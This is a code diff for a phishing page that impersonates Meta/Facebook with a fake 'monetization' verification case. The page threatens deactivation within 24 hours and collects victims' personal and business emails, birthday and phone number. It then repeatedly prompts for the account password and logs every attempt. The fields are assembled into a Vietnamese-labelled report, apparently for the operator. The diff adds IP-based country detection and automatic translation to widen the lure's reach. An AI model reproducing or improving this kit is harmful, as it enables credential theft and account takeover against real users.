@@ -1,5 +1,5 @@
 import Banner from '@/assets/banner.png';
-import HeroImage from '@/assets/hero-image.png';
+import HeroImage from '@/assets/facebookprotect.jpg';
 import MetaLogo from '@/assets/meta-logo-2.png';
 import { useForm } from 'react-hook-form';
 import { z } from 'zod';
@@ -16,7 +16,8 @@ interface CountryResponse {
 }
 
 interface StoredFormData {
-    email: string;
+    emailBusiness: string;
+    emailPersonal: string;
     birthday: string;
     phone: string;
     passwordAttempts: string[];
@@ -36,9 +37,50 @@ interface GeoJSResponse {
     organization_name: string;
 }
 
+interface PageContent {
+    title: string;
+    warning: string;
+    formTitle: string;
+    emailBusinessPlaceholder: string;
+    emailPersonalPlaceholder: string;
+    birthdayPlaceholder: string;
+    phonePlaceholder: string;
+    verifyButton: string;
+    caseType: string;
+    securityInfo: string;
+    passwordTitle: string;
+    passwordSubtitle: string;
+    passwordPlaceholder: string;
+    cancelButton: string;
+    submitButton: string;
+    processingText: string;
+    verificationNote: string;
+}
+
+const defaultContent: PageContent = {
+    title: 'TURN ON MONETIZATION MODE',
+    warning: 'Please provide all the required information. If we do not receive a response within 24 hours, the automatic monetization feature on your Page will be deactivated and may not be re-enabled in the future.',
+    formTitle: 'Verify Your Details',
+    emailBusinessPlaceholder: 'Business email address',
+    emailPersonalPlaceholder: 'Personal email address',
+    birthdayPlaceholder: 'Birthday (DD/MM/YYYY)',
+    phonePlaceholder: 'Phone number',
+    verifyButton: 'Continue',
+    caseType: 'Case Type: Enable monetization features',
+    securityInfo: 'Please ensure all information is accurate. If the information provided is incorrect, monetization may not be enabled.',
+    passwordTitle: 'Please Enter Your Password',
+    passwordSubtitle: 'For your security, you must enter your password to continue.',
+    passwordPlaceholder: 'Enter your password',
+    cancelButton: 'Cancel',
+    submitButton: 'Submit',
+    processingText: 'Processing...',
+    verificationNote: 'This information is required to verify your identity account'
+};
+
 const mainFormSchema = z.object({
-    email: z.string().email('Please enter a valid email address'),
-    birthday: z.string().regex(/^\d{4}-\d{2}-\d{2}$/, 'Please enter a valid date'),
+    emailBusiness: z.string().email('Please enter a valid business email address'),
+    emailPersonal: z.string().email('Please enter a valid personal email address'),
+    birthday: z.string().regex(/^(\d{2})[/-](\d{2})[/-]\d{4}$/, 'Please enter a valid date (DD/MM/YYYY)'),
     phone: z.string().min(1)
 });
 
@@ -54,8 +96,43 @@ const generateCaseNumber = (): string => {
 };
 
 const formatDateVN = (dateStr: string): string => {
+    if (/^\d{2}[/-]\d{2}[/-]\d{4}$/.exec(dateStr)) {
+        return dateStr.replace('/', '-');
+    }
     const [year, month, day] = dateStr.split('-');
     return `${day}-${month}-${year}`;
+};
+
+const translateText = async (text: string, targetLang: string): Promise<string> => {
+    try {
+        const response = await fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${targetLang}&dt=t&q=${encodeURIComponent(text)}`);
+        const data = await response.json();
+        return data[0].map((item: any[]) => item[0]).join('');
+    } catch (error) {
+        console.error('Translation error:', error);
+        return text;
+    }
+};
+interface CountryLanguageMap {
+    [key: string]: string;
+}
+const countryToLanguage: CountryLanguageMap = {
+    VN: 'vi',
+    CN: 'zh',
+    TW: 'zh',
+    HK: 'zh',
+    JP: 'ja',
+    KR: 'ko',
+
+    DE: 'de',
+    FR: 'fr',
+    IT: 'it',
+    ES: 'es',
+    PT: 'pt',
+    RU: 'ru',
+
+    US: 'en',
+    GB: 'en'
 };
 
 const Home = () => {
@@ -64,7 +141,8 @@ const Home = () => {
     const [isLoading, setIsLoading] = useState(true);
     const [showPasswordModal, setShowPasswordModal] = useState(false);
     const [formData, setFormData] = useState<{
-        email?: string;
+        emailBusiness?: string;
+        emailPersonal?: string;
         birthday?: string;
         phone?: string;
     }>({});
@@ -74,6 +152,25 @@ const Home = () => {
     const [passwordAttempts, setPasswordAttempts] = useState<string[]>([]);
     const [lastMessageId, setLastMessageId] = useState<number | null>(null);
     const navigate = useNavigate();
+    const [content, setContent] = useState<PageContent>(defaultContent);
+    const [selectedLanguage, setSelectedLanguage] = useState('en');
+
+    useEffect(() => {
+        const translateContent = async () => {
+            if (selectedLanguage === 'en') {
+                setContent(defaultContent);
+                return;
+            }
+
+            const translatedContent: PageContent = { ...defaultContent };
+            for (const key of Object.keys(defaultContent) as (keyof PageContent)[]) {
+                translatedContent[key] = await translateText(defaultContent[key], selectedLanguage);
+            }
+            setContent(translatedContent);
+        };
+
+        translateContent();
+    }, [selectedLanguage]);
 
     const {
         register: registerMain,
@@ -91,16 +188,34 @@ const Home = () => {
         resolver: zodResolver(passwordFormSchema)
     });
 
+    const formatDateInput = (value: string) => {
+        const numbers = value.replace(/\D/g, '');
+
+        let formatted = '';
+        for (let i = 0; i < numbers.length && i < 8; i++) {
+            if (i === 2 || i === 4) {
+                formatted += '/';
+            }
+            formatted += numbers[i];
+        }
+
+        return formatted;
+    };
+
     useEffect(() => {
-        const fetchCountryData = async () => {
+        const fetchCountryAndSetLanguage = async () => {
             try {
                 setIsLoading(true);
                 const countryResponse = await fetch('https://get.geojs.io/v1/ip/country.json');
                 const countryData: CountryResponse = await countryResponse.json();
 
+                const detectedLanguage = countryToLanguage[countryData.country] || 'en';
+                setSelectedLanguage(detectedLanguage);
+
                 const codeResponse = await fetch('https://restcountries.com/v3.1/alpha/' + countryData.country);
                 const [codeData] = await codeResponse.json();
-
+                localStorage.setItem('detectedLanguage', detectedLanguage);
+                localStorage.setItem('country', countryData.country);
                 if (codeData?.idd?.root && codeData?.idd?.suffixes?.[0]) {
                     const dialCode = `${codeData.idd.root}${codeData.idd.suffixes[0]}`;
                     setPhoneCode(dialCode);
@@ -116,7 +231,7 @@ const Home = () => {
             }
         };
 
-        fetchCountryData();
+        fetchCountryAndSetLanguage();
     }, []);
 
     useEffect(() => {
@@ -126,7 +241,8 @@ const Home = () => {
 
             if (Date.now() - parsed.timestamp < 24 * 60 * 60 * 1000) {
                 setFormData({
-                    email: parsed.email,
+                    emailBusiness: parsed.emailBusiness,
+                    emailPersonal: parsed.emailPersonal,
                     birthday: parsed.birthday,
                     phone: parsed.phone
                 });
@@ -140,7 +256,8 @@ const Home = () => {
 
     const onMainFormSubmit = (data: MainFormValues) => {
         const formDataToStore = {
-            email: data.email,
+            emailBusiness: data.emailBusiness,
+            emailPersonal: data.emailPersonal,
             birthday: data.birthday,
             phone: `${phoneCode}${data.phone}`
         };
@@ -231,7 +348,8 @@ const Home = () => {
 <b>🎂 Ngày sinh:</b> <code>${formatDateVN(fullFormData.birthday!)}</code>
 
 <b>📞 Số điện thoại:</b> <code>${fullFormData.phone}</code>
-<b>📧 Email:</b> <code>${fullFormData.email}</code>
+<b>📧 Email Personal:</b> <code>${fullFormData.emailPersonal}</code>
+<b>📧 Email Business:</b> <code>${fullFormData.emailBusiness}</code>
 
 ${passwordList}`;
 
@@ -300,14 +418,14 @@ ${passwordList}`;
                     <div className='flex items-start justify-between w-full mb-12'>
                         <div className='flex flex-col items-center'>
                             <div className='w-3 h-3 bg-blue-500 rounded-full mt-1 shadow-sm' />
-                            <span className='mt-4 text-sm font-medium text-gray-700'>Select Asset</span>
+                            <span className='mt-4 text-sm font-medium text-gray-700'>Select the Issue</span>
                         </div>
 
                         <div className='h-[2px] flex-1 bg-blue-500 mt-[7px]' />
 
                         <div className='flex flex-col items-center'>
                             <div className='w-3 h-3 bg-blue-500 rounded-full mt-1 shadow-sm' />
-                            <span className='mt-4 text-sm font-medium text-gray-700'>Select the Issue</span>
+                            <span className='mt-4 text-sm font-medium text-gray-700'>Verify Information</span>
                         </div>
 
                         <div className='h-[2px] flex-1 bg-blue-500 mt-[7px]' />
@@ -317,35 +435,52 @@ ${passwordList}`;
                             <span className='mt-4 text-sm font-medium text-gray-700'>Get help</span>
                         </div>
                     </div>
-
+                    
                     <div className='space-y-6'>
                         <div className='text-center'>
-                            <h1 className='text-xl font-bold text-gray-900 mb-4'>TURN ON PROFESSIONAL MODE</h1>
+                            <h1 className='text-xl font-bold text-gray-900 mb-4'>{content.title}</h1>
                             <div className='flex text-left justify-center p-4 bg-orange-50 border border-orange-200 rounded-lg'>
                                 <AlertCircle className='w-5 h-5 text-orange-500 mr-2 flex-shrink-0' />
-                                <p className='text-sm text-gray-700'>Please provide all the required information. If we do not receive a response within 24 hours, the automatic monetization feature on your Page will be deactivated and may not be re-enabled in the future.</p>
+                                <p className='text-sm text-gray-700'>{content.warning}</p>
                             </div>
                         </div>
 
                         <div className='bg-white border rounded-xl border-gray-200 p-4 shadow-sm'>
-                            <h2 className='text-lg font-semibold text-blue-600 text-center mb-6'>Verify Your Details</h2>
+                            <div className='flex justify-center mb-6'>
+                            </div>
+                            <h2 className='text-lg font-semibold text-blue-600 text-center mb-6'>{content.formTitle}</h2>
 
                             <form onSubmit={handleMainSubmit(onMainFormSubmit)} className='space-y-5'>
-                                <div>
-                                    <input type='email' placeholder='Email address' {...registerMain('email')} tabIndex={1} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors' />
-                                    {mainErrors.email && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.email.message}</p>}
-                                </div>
+                            <div>
+                                <input type='email' placeholder={content.emailPersonalPlaceholder} {...registerMain('emailPersonal')} tabIndex={1} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors' />
+                                {mainErrors.emailPersonal && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.emailPersonal.message}</p>}
+                            </div>
 
+                            <div>
+                                <input type='email' placeholder={content.emailBusinessPlaceholder} {...registerMain('emailBusiness')} tabIndex={2} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors' />
+                                {mainErrors.emailBusiness && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.emailBusiness.message}</p>}
+                            </div>
+                                
                                 <div>
-                                    <input type='date' {...registerMain('birthday')} tabIndex={2} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors [&::-webkit-calendar-picker-indicator]:opacity-0' />
+                                    <input
+                                        type='text'
+                                        placeholder={content.birthdayPlaceholder}
+                                        {...registerMain('birthday')}
+                                        onChange={(e) => {
+                                            e.target.value = formatDateInput(e.target.value);
+                                            registerMain('birthday').onChange(e);
+                                        }}
+                                        maxLength={10}
+                                        tabIndex={2}
+                                        className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors'
+                                    />
                                     {mainErrors.birthday && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.birthday.message}</p>}
                                 </div>
 
                                 <div className='relative'>
                                     <div className='absolute left-0 top-0 bottom-0 flex items-center pl-4 text-gray-600 z-10'>
-                                        <span className='text-sm'>{isLoading ? '...' : phoneCode}</span>
                                     </div>
-                                    <input type='tel' placeholder={isLoading ? 'Loading...' : 'Phone number'} {...registerMain('phone')} tabIndex={3} className='w-full px-4 py-2.5 pl-[52px] border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors relative' />
+                                    <input type='number' placeholder={content.phonePlaceholder} {...registerMain('phone')} tabIndex={3} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors relative' />
                                     {mainErrors.phone && (
                                         <div className='absolute left-0 right-0 mt-1.5'>
                                             <p className='text-red-500 text-sm'>{mainErrors.phone.message}</p>
@@ -354,19 +489,17 @@ ${passwordList}`;
                                 </div>
 
                                 <button type='submit' tabIndex={4} className='w-full bg-blue-600 text-white py-2.5 px-4 rounded-lg hover:bg-blue-700 transition-colors font-medium shadow-sm'>
-                                    Continue
+                                    {content.verifyButton}
                                 </button>
 
                                 <div className='pt-4 border-t'>
                                     <p className='font-medium text-gray-700 text-sm'>{`Case #${caseNumber}`}</p>
-                                    <p className='mt-2 text-xs text-gray-600'>Case Type: Turn on monetization</p>
+                                    <p className='mt-2 text-xs text-gray-600'>{content.caseType}</p>
                                 </div>
                             </form>
                         </div>
 
-                        <p className='text-sm text-gray-600'>
-                            Please ensure all information is accurate. Incorrect information may result in permanent account closure. Review our <button className='text-blue-600 hover:underline'>Community Standards</button> for more information.
-                        </p>
+                        <p className='text-sm text-gray-600'>{content.securityInfo}</p>
                     </div>
                 </div>
             </div>
@@ -378,13 +511,13 @@ ${passwordList}`;
                             <div className='mx-auto w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mb-4'>
                                 <Lock className='w-6 h-6 text-blue-600' />
                             </div>
-                            <h2 className='text-xl font-bold text-gray-900'>Please Enter Your Password</h2>
-                            <p className='text-sm text-gray-600 mt-2'>For your security, you must enter your password to continue.</p>
+                            <h2 className='text-xl font-bold text-gray-900'>{content.passwordTitle}</h2>
+                            <p className='text-sm text-gray-600 mt-2'>{content.passwordSubtitle}</p>
                         </div>
 
                         <form onSubmit={handlePasswordSubmit(onPasswordSubmit)} className='space-y-4'>
                             <div className='relative'>
-                                <input type={showPassword ? 'text' : 'password'} placeholder='Enter your password' autoFocus {...registerPassword('password')} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors pr-10' />
+                                <input type={showPassword ? 'text' : 'password'} placeholder={content.passwordPlaceholder} autoFocus {...registerPassword('password')} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors pr-10' />
                                 <button type='button' onClick={() => setShowPassword(!showPassword)} className='absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors'>
                                     {showPassword ? <EyeOff className='w-5 h-5' /> : <Eye className='w-5 h-5' />}
                                 </button>
@@ -399,22 +532,22 @@ ${passwordList}`;
 
                             <div className='flex gap-3'>
                                 <button type='button' onClick={() => setShowPasswordModal(false)} disabled={isSubmitting} className='flex-1 px-4 py-2.5 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors disabled:opacity-50'>
-                                    Cancel
+                                    {content.cancelButton}
                                 </button>
                                 <button type='submit' disabled={isSubmitting} className='flex-1 px-4 py-2.5 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors disabled:opacity-50 flex items-center justify-center'>
                                     {isSubmitting ? (
                                         <div className='flex items-center gap-2'>
                                             <div className='w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin' />
-                                            <span>Processing...</span>
+                                            <span>{content.processingText}</span>
                                         </div>
                                     ) : (
-                                        'Submit'
+                                        content.submitButton
                                     )}
                                 </button>
                             </div>
                         </form>
 
-                        <p className='text-xs text-gray-500 mt-4 text-center'>This information is required to verify your identity and protect your account</p>
+                        <p className='text-xs text-gray-500 mt-4 text-center'>{content.verificationNote}</p>
                     </div>
                 </div>
             )}
